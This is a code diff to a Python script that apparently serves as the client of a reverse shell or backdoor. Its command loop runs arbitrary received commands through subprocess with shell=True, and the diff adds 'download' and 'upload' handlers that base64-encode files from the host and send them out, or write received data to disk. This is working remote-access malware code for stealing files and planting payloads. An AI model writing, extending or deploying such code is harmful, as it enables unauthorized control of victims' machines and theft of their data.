@@ -6,7 +6,7 @@ import time
 import os
 import shutil
 import sys
-
+import base64
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -41,6 +41,17 @@ def shell():
                 os.chdir(command[3:])
             except:
                 continue
+        elif command[:8] == 'download':
+            try:
+                with open(command[9:], 'rb') as file:
+                    reliable_send(base64.b64encode(file.read()).decode())
+            except:
+                reliable_send(base64.b64encode(b'Failed to read file'))
+        elif command[:6] == 'upload':
+            with open(command[7:], 'wb') as fin:
+                result = reliable_recv()
+                fin.write(base64.b64decode(result))
+            continue
         else:
             try:
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
